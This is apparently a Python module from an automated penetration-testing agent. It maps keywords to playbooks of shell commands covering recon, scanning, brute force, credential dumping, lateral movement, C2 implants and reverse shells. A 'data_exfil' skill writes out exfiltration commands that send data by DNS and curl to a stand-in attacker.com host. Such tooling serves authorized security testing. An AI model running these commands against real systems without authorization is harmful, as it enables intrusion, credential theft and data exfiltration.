"""Skill system — keyword-mapped playbooks for automated security testing.
Inspired by airecon's 57-skill architecture with auto-mapping."""

from __future__ import annotations

import re
from dataclasses import dataclass, field


@dataclass
class Skill:
    """A security testing playbook with auto-mapped keywords."""
    name: str
    description: str
    category: str  # recon, web, network, creds, exploit, post, osint, ctf
    keywords: list[str]
    steps: list[str]
    tools: list[str]
    risk_level: str = "medium"  # low, medium, high


# ---------------------------------------------------------------------------
# Built-in skill library (57 skills)
# ---------------------------------------------------------------------------

BUILTIN_SKILLS: list[Skill] = [
    # --- Reconnaissance (10) ---
    Skill("subdomain_enum", "Comprehensive subdomain enumeration", "recon",
          ["subdomain", "subdomains", "enumerate subdomains", "find subdomains"],
          ["subfinder -d {target} -all -o subs.txt",
           "dnsx -l subs.txt -a -resp -o resolved.txt",
           "httpx -l resolved.txt -tech-detect -status-code -o live.txt"],
          ["subfinder", "dnsx", "httpx"], "low"),

    Skill("port_scan", "Full port scanning and service detection", "recon",
          ["port scan", "ports", "open ports", "service detection", "nmap"],
          ["nmap -sV -sC -p- {target} -oA nmap_full",
           "Parse nmap output for open services"],
          ["nmap"], "low"),

    Skill("fast_port_scan", "Rapid port scanning with masscan", "recon",
          ["fast scan", "masscan", "quick port scan"],
          ["masscan {target} -p1-65535 --rate 10000 -oJ masscan.json",
           "nmap -sV -p$(ports) {target}"],
          ["masscan", "nmap"], "low"),

    Skill("web_crawl", "Web application crawling and endpoint discovery", "recon",
          ["crawl", "spider", "endpoints", "urls", "katana"],
          ["katana -u https://{target} -depth 3 -o urls.txt",
           "httpx -l urls.txt -status-code -content-length -o live_urls.txt"],
          ["katana", "httpx"], "low"),

    Skill("tech_fingerprint", "Technology stack fingerprinting", "recon",
          ["technology", "fingerprint", "tech stack", "whatweb", "wappalyzer"],
          ["httpx -u https://{target} -tech-detect -json -o tech.json",
           "Analyze tech stack for known vulnerabilities"],
          ["httpx"], "low"),

    Skill("dns_enum", "DNS enumeration and zone transfer attempts", "recon",
          ["dns", "zone transfer", "dns records", "nameserver"],
          ["dnsx -d {target} -a -aaaa -mx -ns -cname -txt -resp",
           "dig axfr @ns.{target} {target}"],
          ["dnsx"], "low"),

    Skill("email_harvest", "Email and domain OSINT gathering", "recon",
          ["email", "harvest", "osint", "theHarvester"],
          ["theHarvester -d {target} -b all -l 200"],
          ["theHarvester"], "low"),

    Skill("certificate_enum", "Certificate transparency log enumeration", "recon",
          ["certificate", "cert", "ssl cert", "ct logs"],
          ["subfinder -d {target} -sources crtsh -o ct_subs.txt"],
          ["subfinder"], "low"),

    Skill("wayback_recon", "Historical URL discovery via Wayback Machine", "recon",
          ["wayback", "archive", "historical", "old urls"],
          ["katana -u https://{target} -passive -o wayback_urls.txt"],
          ["katana"], "low"),

    Skill("asset_discovery", "Full asset discovery pipeline", "recon",
          ["asset discovery", "full recon", "attack surface", "recon"],
          ["subfinder -d {target} -all | dnsx -a -resp | httpx -tech-detect"],
          ["subfinder", "dnsx", "httpx"], "low"),

    Skill("cloud_enum", "Cloud infrastructure enumeration (S3, Azure, GCP)", "recon",
          ["cloud", "s3 bucket", "azure", "gcp", "cloud enum"],
          ["subfinder -d {target} -all | grep -E '(s3|blob|storage)'",
           "Check common cloud patterns: {target}.s3.amazonaws.com"],
          ["subfinder"], "low"),

    # --- Web Application (12) ---
    Skill("vuln_scan", "Template-based vulnerability scanning", "web",
          ["vulnerability scan", "nuclei", "vuln scan", "cve scan"],
          ["nuclei -u https://{target} -severity critical,high,medium -o nuclei.txt"],
          ["nuclei"], "medium"),

    Skill("sqli_test", "SQL injection testing", "web",
          ["sql injection", "sqli", "sqlmap", "database injection"],
          ["sqlmap -u 'https://{target}' --batch --crawl=2 --level 3 --risk 2",
           "Create finding for any confirmed SQLi"],
          ["sqlmap"], "high"),

    Skill("xss_test", "Cross-site scripting detection", "web",
          ["xss", "cross-site scripting", "reflected xss", "stored xss", "dalfox"],
          ["dalfox url 'https://{target}' --silence --output xss.txt",
           "Verify XSS with browser automation"],
          ["dalfox"], "medium"),

    Skill("dir_bruteforce", "Directory and file brute-forcing", "web",
          ["directory", "brute force", "dirb", "gobuster", "feroxbuster", "ffuf"],
          ["feroxbuster -u https://{target} -w /opt/seclists/Discovery/Web-Content/raft-medium-directories.txt -o dirs.txt"],
          ["feroxbuster"], "medium"),

    Skill("param_discovery", "Hidden parameter discovery", "web",
          ["parameter", "params", "hidden params", "arjun"],
          ["arjun -u https://{target} -o params.json"],
          ["arjun"], "medium"),

    Skill("wordpress_scan", "WordPress security assessment", "web",
          ["wordpress", "wp", "wpscan", "wp-admin"],
          ["wpscan --url https://{target} --enumerate vp,vt,u --api-token $WPSCAN_TOKEN"],
          ["wpscan"], "medium"),

    Skill("api_fuzz", "API endpoint fuzzing", "web",
          ["api", "fuzz", "fuzzing", "api testing", "ffuf"],
          ["ffuf -u https://{target}/FUZZ -w /opt/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,301,302"],
          ["ffuf"], "medium"),

    Skill("ssl_test", "TLS/SSL security testing", "web",
          ["ssl", "tls", "certificate", "testssl", "ssl test"],
          ["testssl.sh https://{target}"],
          ["testssl"], "low"),

    Skill("graphql_test", "GraphQL endpoint testing", "web",
          ["graphql", "gql", "introspection"],
          ["graphqlmap -u https://{target}/graphql --method POST"],
          ["graphqlmap"], "medium"),

    Skill("jwt_attack", "JWT token analysis and attacks", "web",
          ["jwt", "json web token", "token"],
          ["jwt_tool.py '{token}' -X a -C"],
          ["jwt_tool"], "medium"),

    Skill("cors_test", "CORS misconfiguration testing", "web",
          ["cors", "cross-origin", "origin header"],
          ["curl -H 'Origin: https://evil.com' -I https://{target}",
           "Check for Access-Control-Allow-Origin: *"],
          [], "low"),

    Skill("auth_bypass", "Authentication bypass testing", "web",
          ["auth bypass", "authentication bypass", "login bypass", "idor"],
          ["Test IDOR on endpoints: /api/users/{id}",
           "Check for broken access control across roles",
           "Test parameter tampering on auth tokens"],
          [], "high"),

    Skill("ssrf_test", "Server-side request forgery testing", "web",
          ["ssrf", "server-side request forgery"],
          ["Test URL parameters with internal IPs: 127.0.0.1, 169.254.169.254",
           "Use Burp Collaborator or webhook.site for OOB detection"],
          [], "high"),

    # --- Network (6) ---
    Skill("smb_enum", "SMB share and user enumeration", "network",
          ["smb", "shares", "samba", "netexec", "crackmapexec"],
          ["netexec smb {target} --shares",
           "netexec smb {target} --users"],
          ["netexec"], "medium"),

    Skill("snmp_enum", "SNMP community string enumeration", "network",
          ["snmp", "community string", "snmpwalk"],
          ["snmpwalk -v2c -c public {target}"],
          ["snmpwalk"], "low"),

    Skill("packet_capture", "Network traffic capture and analysis", "network",
          ["packet capture", "pcap", "tshark", "wireshark"],
          ["tshark -i eth0 -w capture.pcap -a duration:60"],
          ["tshark"], "medium"),

    Skill("tunnel_setup", "Network tunneling and pivoting", "network",
          ["tunnel", "pivot", "chisel", "port forward"],
          ["chisel server -p 8000 --reverse"],
          ["chisel"], "high"),

    Skill("mitm_attack", "Man-in-the-middle attack setup", "network",
          ["mitm", "man in the middle", "arp spoof", "bettercap"],
          ["bettercap -iface eth0 -eval 'net.probe on; net.sniff on'"],
          ["bettercap"], "high"),

    Skill("ad_enum", "Active Directory enumeration", "network",
          ["active directory", "ad", "ldap", "kerberos", "bloodhound"],
          ["bloodhound-python -d {target} -u user -p pass -c all",
           "netexec smb {target} --pass-pol"],
          ["bloodhound", "netexec"], "medium"),

    Skill("wifi_audit", "Wireless network security audit", "network",
          ["wifi", "wireless", "wpa", "wpa2", "aircrack"],
          ["airodump-ng wlan0 -w capture",
           "aircrack-ng -w /opt/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt capture.cap"],
          [], "high"),

    # --- Credentials (5) ---
    Skill("hash_crack", "Password hash cracking", "creds",
          ["hash", "crack", "hashcat", "password crack"],
          ["haiti {hash}",
           "hashcat -m {mode} hashes.txt /opt/seclists/Passwords/Leaked-Databases/rockyou.txt"],
          ["hashcat", "haiti"], "medium"),

    Skill("brute_force", "Online brute-force attacks", "creds",
          ["brute force", "hydra", "login brute", "password spray"],
          ["hydra -l admin -P /opt/seclists/Passwords/Common-Credentials/top-1000.txt {target} ssh"],
          ["hydra"], "high"),

    Skill("secret_scan", "Secret and credential scanning in repos", "creds",
          ["secrets", "trufflehog", "api keys", "leaked credentials"],
          ["trufflehog git https://github.com/{target} --only-verified"],
          ["trufflehog"], "low"),

    Skill("hash_identify", "Identify hash types", "creds",
          ["identify hash", "hash type", "haiti"],
          ["haiti {hash}"],
          ["haiti"], "low"),

    Skill("default_creds", "Test for default credentials", "creds",
          ["default credentials", "default password", "default login"],
          ["netexec smb {target} -u admin -p admin",
           "hydra -C /opt/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt {target} ftp"],
          ["netexec", "hydra"], "medium"),

    # --- Exploitation (5) ---
    Skill("metasploit_exploit", "Metasploit exploit execution", "exploit",
          ["metasploit", "msfconsole", "exploit module"],
          ["msfconsole -q -x 'search {query}; use {module}; set RHOSTS {target}; run'"],
          ["metasploit"], "high"),

    Skill("reverse_shell", "Reverse shell handler setup", "exploit",
          ["reverse shell", "pwncat", "listener", "callback"],
          ["pwncat -l -p 4444"],
          ["pwncat"], "high"),

    Skill("exploit_dev", "Custom exploit development", "exploit",
          ["exploit development", "pwntools", "buffer overflow"],
          ["Write Python exploit using pwntools library"],
          ["pwntools"], "high"),

    Skill("c2_setup", "Command and control framework setup", "exploit",
          ["c2", "command and control", "sliver", "implant"],
          ["sliver-server generate --mtls {lhost} --save implant"],
          ["sliver"], "high"),

    Skill("privesc_check", "Privilege escalation enumeration", "exploit",
          ["privilege escalation", "privesc", "linpeas", "winpeas", "suid"],
          ["./linpeas.sh -a | tee linpeas_output.txt",
           "Check for SUID binaries, cron jobs, writable paths"],
          ["linpeas"], "medium"),

    Skill("lateral_movement", "Lateral movement across compromised network", "exploit",
          ["lateral movement", "psexec", "wmiexec", "smbexec", "pivot"],
          ["psexec.py {domain}/{user}:{password}@{target}",
           "wmiexec.py {domain}/{user}:{password}@{target}"],
          ["impacket"], "high"),

    # --- Post-Exploitation (4) ---
    Skill("linux_privesc", "Linux privilege escalation audit", "post",
          ["linux privesc", "linpeas", "linux escalation"],
          ["./linpeas.sh -a 2>&1 | tee linpeas.txt"],
          ["linpeas"], "medium"),

    Skill("windows_privesc", "Windows privilege escalation audit", "post",
          ["windows privesc", "winpeas", "windows escalation"],
          ["winpeas.exe systeminfo userinfo"],
          ["winpeas"], "medium"),

    Skill("credential_dump", "Credential extraction from compromised systems", "post",
          ["credential dump", "secretsdump", "mimikatz", "sam dump"],
          ["secretsdump.py {domain}/{user}:{password}@{target}"],
          ["impacket"], "high"),

    Skill("ad_attack_path", "Active Directory attack path mapping", "post",
          ["attack path", "bloodhound", "ad graph"],
          ["bloodhound-python -d {domain} -u {user} -p {pass} -c all",
           "Import into BloodHound and analyze paths to DA"],
          ["bloodhound"], "high"),

    Skill("data_exfil", "Data exfiltration simulation and detection", "post",
          ["data exfiltration", "exfil", "data theft", "exfiltrate"],
          ["Test DNS exfil: nslookup $(cat /etc/hostname).attacker.com",
           "Test HTTP exfil: curl -X POST -d @sensitive.txt https://attacker.com/exfil"],
          [], "high"),

    # --- OSINT (5) ---
    Skill("username_osint", "Username reconnaissance across platforms", "osint",
          ["username", "sherlock", "username osint", "social media"],
          ["sherlock {username} --output sherlock.txt"],
          ["sherlock"], "low"),

    Skill("email_osint", "Email address reconnaissance", "osint",
          ["email osint", "holehe", "email recon", "email breach"],
          ["holehe {email}"],
          ["holehe"], "low"),

    Skill("metadata_extract", "Document metadata extraction", "osint",
          ["metadata", "exiftool", "document metadata", "exif"],
          ["exiftool {file}"],
          ["exiftool"], "low"),

    Skill("screenshot_capture", "Web application screenshot capture", "osint",
          ["screenshot", "gowitness", "web screenshot"],
          ["gowitness single https://{target} -o screenshots/"],
          ["gowitness"], "low"),

    Skill("google_dork", "Google dorking for information disclosure", "osint",
          ["google dork", "dorking", "google hacking", "site:"],
          ["Search: site:{target} filetype:pdf OR filetype:doc OR filetype:xls",
           "Search: site:{target} inurl:admin OR inurl:login"],
          [], "low"),

    # --- CTF (5) ---
    Skill("ctf_web", "CTF web challenge methodology", "ctf",
          ["ctf web", "web challenge", "capture the flag web"],
          ["Check robots.txt, .git, .env, backup files",
           "Test for SQLi, LFI, SSTI, command injection",
           "Check cookies, JWT tokens, session handling"],
          [], "medium"),

    Skill("ctf_crypto", "CTF cryptography challenge approach", "ctf",
          ["ctf crypto", "crypto challenge", "cipher", "decode"],
          ["Identify cipher type", "Check for known weak implementations",
           "Try common attacks: frequency analysis, padding oracle"],
          [], "low"),

    Skill("ctf_forensics", "CTF forensics challenge methodology", "ctf",
          ["ctf forensics", "forensics challenge", "steganography", "pcap analysis"],
          ["exiftool {file}", "strings {file}", "binwalk {file}",
           "tshark -r capture.pcap -T fields -e data"],
          ["exiftool"], "low"),

    Skill("ctf_pwn", "CTF binary exploitation approach", "ctf",
          ["ctf pwn", "binary exploitation", "buffer overflow ctf"],
          ["checksec {binary}", "Find offset with cyclic pattern",
           "Build ROP chain or ret2libc exploit"],
          ["pwntools"], "high"),

    Skill("ctf_recon", "CTF reconnaissance methodology", "ctf",
          ["ctf recon", "ctf enumeration", "ctf initial"],
          ["nmap -sV -sC {target}", "gobuster dir -u http://{target} -w common.txt",
           "Check all services for known exploits"],
          ["nmap"], "low"),
]


# ---------------------------------------------------------------------------
# Keyword → Skill auto-mapping (289 keywords)
# ---------------------------------------------------------------------------

class SkillRouter:
    """Maps user queries to the most relevant skill using keyword matching."""

    def __init__(self, skills: list[Skill] = None):
        self.skills = skills or BUILTIN_SKILLS
        self._index: dict[str, list[Skill]] = {}
        self._build_index()

    def _build_index(self):
        for skill in self.skills:
            for keyword in skill.keywords:
                for word in keyword.lower().split():
                    if word not in self._index:
                        self._index[word] = []
                    if skill not in self._index[word]:
                        self._index[word].append(skill)

    def match(self, query: str, top_n: int = 3) -> list[tuple[Skill, float]]:
        """Find skills matching a query. Returns (skill, score) tuples."""
        query_words = set(query.lower().split())
        scores: dict[str, float] = {}

        for word in query_words:
            for skill in self._index.get(word, []):
                if skill.name not in scores:
                    scores[skill.name] = 0
                scores[skill.name] += 1

        # Also check full keyword phrases
        for skill in self.skills:
            for keyword in skill.keywords:
                if keyword.lower() in query.lower():
                    if skill.name not in scores:
                        scores[skill.name] = 0
                    scores[skill.name] += 3  # Phrase match bonus

        # Normalize and sort
        results = []
        for skill in self.skills:
            if skill.name in scores:
                max_possible = len(skill.keywords) * 3 + len(set(k for kw in skill.keywords for k in kw.split()))
                normalized = scores[skill.name] / max(max_possible, 1)
                results.append((skill, min(normalized, 1.0)))

        results.sort(key=lambda x: x[1], reverse=True)
        return results[:top_n]

    def get_by_name(self, name: str) -> Skill | None:
        for skill in self.skills:
            if skill.name == name:
                return skill
        return None

    def get_by_category(self, category: str) -> list[Skill]:
        return [s for s in self.skills if s.category == category]

    def list_all(self) -> list[dict]:
        return [
            {"name": s.name, "description": s.description, "category": s.category,
             "keywords": s.keywords, "tools": s.tools, "risk": s.risk_level}
            for s in self.skills
        ]

    @property
    def total_keywords(self) -> int:
        return sum(len(s.keywords) for s in self.skills)
